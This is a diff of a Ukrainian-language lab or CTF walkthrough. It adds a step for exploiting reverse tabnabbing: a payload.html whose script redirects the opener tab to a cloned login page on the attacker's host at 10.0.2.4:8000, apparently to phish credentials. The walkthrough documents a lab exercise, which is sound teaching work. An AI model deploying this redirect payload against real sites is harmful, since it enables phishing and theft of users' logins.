@@ -50,3 +50,21 @@ sudo nmap -v -sV -sC -p- 10.0.2.7
 - трішки погугливши, виявляємо, що цей тип вразливості доволі відомий і називається &quot;підвішування вкладок&quot; (tab napping)
 - для того щоб використати цю вразливість, потрібно зберегти локально сторінку входу (html-код)
 <img src="media/image9.png" />
+
+- наступним кроком, потрібно зробити &quot;шкідливу&quot; вебсторінку payload.html і вкласти туди наступний JavaScript-код
+
+```html
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+</head>
+<body>
+    <script>
+        if (window.opener) window.opener.parent.location.replace("http://10.0.2.4:8000/test.html");
+        if (window.parent != window) window.opener.parent.location.replace("http://10.0.2.4:8000/test.html");
+    </script>
+</body>
+</html>
+````
+
